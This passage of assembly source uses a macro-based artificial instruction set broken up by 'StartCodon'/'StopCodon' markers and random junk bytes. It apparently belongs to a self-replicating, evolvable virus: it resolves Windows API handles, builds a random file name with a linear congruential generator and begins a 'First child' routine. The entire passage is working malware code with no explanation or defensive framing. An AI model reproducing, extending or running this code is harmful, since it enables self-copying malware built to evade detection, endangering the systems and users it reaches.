    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
db StopCodon
db 3
db StartCodon
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _saveWrtOff
    _getDO
    BigNum=APIMagicNumbersReg-DataOffset
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
db StopCodon
db 150
db 244
db 143
db 228
db 22
db 35
db 169
db 224
db 68
db 80
db 150
db StartCodon
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _writeDWord      ; Saves the MagicNumber Pointer
_save           ; BC2=BC1
db StopCodon
db 188
db 228
db 190
db 60
db 44
db 0
db 165
db 41
db 48
db 227
db 116
db 126
db 60
db 69
db 151
db 213
db 200
db 30
db 210
db 13
db 110
db 122
db 21
db 93
db 68
db 75
db 170
db 7
db 170
db 49
db 67
db StartCodon
_xor            ; BC1=BC1 XOR BC2 = 0
    BigNum=42
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
db StopCodon
db 153
db 52
db 113
db 234
db StartCodon
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _save
       _pop
       _sub0001
       _push
    BigNum=1
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
db StopCodon
db 138
db 145
db 48
db 237
db 105
db 40
db 98
db 31
db 184
db 253
db 249
db 56
db 83
db 25
db 82
db 186
db StartCodon
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _xor
       _JnzUp
       _pop                    ; Remove trash from stack
_save           ; BC2=BC1
_xor            ; BC1=BC1 XOR BC2 = 0
    BigNum=0x8007
    AlreadyStarted=0
db StopCodon
db 151
db 145
db 92
db 82
db 48
db 67
db 8
db 206
db 75
db 156
db 220
db 143
db 77
db 103
db 57
db 219
db 178
db 219
db 146
db 119
db 16
db StartCodon
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
db StopCodon
db 88
db 251
db 178
db 252
db 190
db StartCodon
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _push
    _getDO
    BigNum=hSetErrorMode-DataOffset
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
    _getdata
    _call
    _getDO
    BigNum=hGetTickCount-DataOffset
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
db StopCodon
db 16
db 23
db 117
db 161
db 123
db 128
db 253
db 73
db StartCodon
        _xor   ; BC1=0
        _add0001
db StopCodon
db 176
db 15
db 96
db 168
db 231
db 102
db 100
db 39
db 27
db StartCodon
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
db StopCodon
db 8
db 132
db 110
db 100
db 51
db 162
db StartCodon
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
    _getdata
    _call
; ############################################################################
db StopCodon
db 238
db 210
db 137
db 9
db 172
db 227
db 147
db 5
db 32
db 135
db 188
db 80
db 217
db 210
db 106
db 131
db 220
db 158
db 65
db 200
db 118
db 228
db 195
db 186
db 221
db 70
db StartCodon
; ############################################################################
; ############################################################################
; #####
; #####   First child ...
; #####
    _getDO
    BigNum=RandomNumber-DataOffset
    AlreadyStarted=0
    if BigNum<25
db StopCodon
db 84
db 130
db StartCodon
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
db StopCodon
db 78
db 163
db 79
db 94
db 156
db 173
db 197
db 252
db 34
db 154
db 109
db 125
db 153
db 238
db 65
db 205
db 66
db 220
db 68
db StartCodon
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
db StopCodon
db 237
db 127
db 16
db 199
db 215
db StartCodon
        _pushall                ; save all registers
        _push                   ; save BC1
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
db StopCodon
db 169
db 145
db 99
db 158
db 94
db 231
db StartCodon
        _save
        _and
        _popall
    end if
       _saveWrtOff
       _nopsA
       _writeDWord              ; mov dword[RandomNumber], RegA
_save           ; BC2=BC1
_xor            ; BC1=BC1 XOR BC2 = 0
       _nopdB                  ; mov RegB, 0
;   RndNameLoop:
       _getEIP
       _sub0001
       _sub0001
       _sub0001
       _sub0001
       _sub0001
       _saveJmpOff              ; mov esi, eip
    _getDO
    BigNum=RandomNumber-DataOffset
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
db StopCodon
db 37
db 225
db 80
db 132
db 243
db 232
db 149
db 186
db StartCodon
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _getdata
       _nopdA                   ; mov eax, [RandomNumber]
_save           ; BC2=BC1
_xor            ; BC1=BC1 XOR BC2 = 0
       _nopdD                   ; mov edx, 0
    BigNum=26
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
db StopCodon
db 107
db 138
db 181
db 214
db 28
db 45
db StartCodon
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _div                     ; div ebx
       _nopsD
    BigNum=97
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
db StopCodon
db 40
db 251
db 44
db 186
db 149
db 4
db 168
db 204
db 5
db 218
db 212
db 30
db 55
db 112
db 35
db 26
db 56
db 139
db 132
db 208
db 141
db 3
db 127
db 242
db 2
db 155
db 73
db 86
db 91
db 170
db 137
db 235
db 61
db 49
db 7
db 150
db 203
db 189
db 242
db 51
db 167
db 53
db 112
db 32
db 141
db 130
db 169
db StartCodon
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _nopdD                   ; add edx, 97
       _nopsB      ; ebx=ebp=count
       _save       ; ebp=ebx=ecx=count
    _getDO
    BigNum=RandomFileName-DataOffset
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
db StopCodon
db 16
db 90
db StartCodon
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
                      ; ebx=rfn, ebp=ecx=count
       _addsaved   ; ebx=rfn+count, ebp=ecx=count
       _saveWrtOff ; edi=rfn+count, ebx=rfn+count, ebp=ecx=count
       _nopsD
       _writeByte               ; mov byte[ecx+RandomFileName], dl
    _getDO
    BigNum=RandomNumber-DataOffset
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
        _saveWrtOff
        _getdata
        _nopdA                   ; eax=[RandomNumber]
_save           ; BC2=BC1
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_xor            ; BC1=BC1 XOR BC2 = 0
    BigNum=1103515245
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
db StopCodon
db 163
db 161
db 242
db 106
db 112
db 190
db 251
db 120
db 53
db 56
db 71
db 62
db 197
db 13
db 140
db 62
db 159
db 213
db 125
db 235
db 218
db StartCodon
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
        _mul                     ; eax*=1103515245 % 2^32
_save           ; BC2=BC1
db StopCodon
db 34
db 128
db 233
db 76
db 80
db 143
db 237
db 45
db 41
db 150
db 63
db 101
db 107
db 234
db StartCodon
_xor            ; BC1=BC1 XOR BC2 = 0
    BigNum=12345
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
        _save
        _nopsA
        _addsaved                ; eax+=12345 % 2^32
        _writeDWord              ; mov [RandomNumber], ebx
       _nopsB
    BigNum=1
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
db StopCodon
db 142
db 79
db 23
db 56
db 19
db 71
db 155
db 40
db 30
db 77
db 223
db 36
db 133
db 249
db 163
db 55
db 172
db 252
db 16
db 102
db 205
db 73
db 116
db 33
db 241
db 154
db 237
db 11
db 234
db 255
db 63
db 207
db 62
db 221
db 0
db 211
db 31
db 223
db 226
db 149
db 68
db 9
db 139
db StartCodon
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _nopdB
       _save                    ; inc counter
_pushall
_save           ; BC2=BC1
db StopCodon
db 27
db StartCodon
_xor            ; BC1=BC1 XOR BC2 = 0
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
_popall
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
    BigNum=8
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
db StopCodon
db 70
db 98
db 8
db 21
db 21
db 69
db 99
db 153
db 196
db 30
db 30
db 147
db 199
db 146
db 112
db 192
db 145
db 20
db 48
db 79
db 228
db 239
db 14
db 213
db 187
db 65
db 127
db 16
db 71
db 21
db 137
db 70
db 102
db 105
db 222
db 220
db 200
db 242
db StartCodon
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
db StopCodon
db 6
db 216
db 139
db 147
db 14
db 176
db 175
db 179
db 36
db 209
db 79
db 155
db 182
db 160
db 44
db 228
db 91
db 245
db 75
db 253
db 223
db 92
db 174
db 168
db 184
db 225
db 111
db 6
db 113
db 28
db 69
db 249
db 231
db 224
db 199
db 188
db 236
db 219
db 151
db 20
db 102
db 252
db 26
db 62
db 213
db StartCodon
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
        _push           ; save BC1
_pushall
_save           ; BC2=BC1
_xor            ; BC1=BC1 XOR BC2 = 0
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
db StopCodon
db 236
db 93
db 0
db 29
db 37
db 161
db 160
db 225
db 79
db 98
db 23
db 48
db 81
db 39
db 37
db 154
db 183
db 126
db 198
db 207
db 133
db StartCodon
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
_popall
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _sub0001        ; BC1=0xFFFFFFFF
db StopCodon
db 233
db 50
db 34
db 156
db 28
db 214
db 197
db 11
db 52
db 22
db 228
db 174
db 148
db 90
db 188
db 105
db 249
db 52
db 155
db 119
db StartCodon
        _xor            ; BC1=0xFFFFFFFF XOR BC2
        _add0001        ; BC1=-BC2
        _save           ; BC2=-BC2
db StopCodon
db 53
db 47
db 222
db 2
db 22
db 5
db 3
db 62
db 223
db 225
db 32
db 56
db 192
db 235
db 157
db 233
db 186
db 79
db 49
db 7
db 155
db 211
db 177
db 162
db 242
db 122
